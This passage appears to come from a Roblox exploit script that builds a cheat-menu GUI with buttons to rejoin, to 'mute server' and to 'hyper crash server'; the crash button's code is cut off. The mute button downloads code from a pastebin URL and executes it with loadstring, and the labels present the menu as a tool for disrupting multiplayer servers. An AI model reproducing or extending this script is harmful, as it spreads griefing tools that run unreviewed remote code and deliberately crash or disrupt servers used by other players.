}) Tab:AddButton({
	Name = "rejoin (if the lag is still there for you or any other issues)",
	Callback = function()
      		-- rejoin		
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Rejoin = coroutine.create(function()
    local Success, ErrorMessage = pcall(function()
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end)

    if ErrorMessage and not Success then
        warn(ErrorMessage)
    end
end)

coroutine.resume(Rejoin)
  	end    
}) Tab:AddButton({
	Name = "mute server (press once)",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/5gjuSZwz"))()
  	end    
}) Tab:AddButton({
	Name = "hyper crash server (finished but im still pushing its limit)",
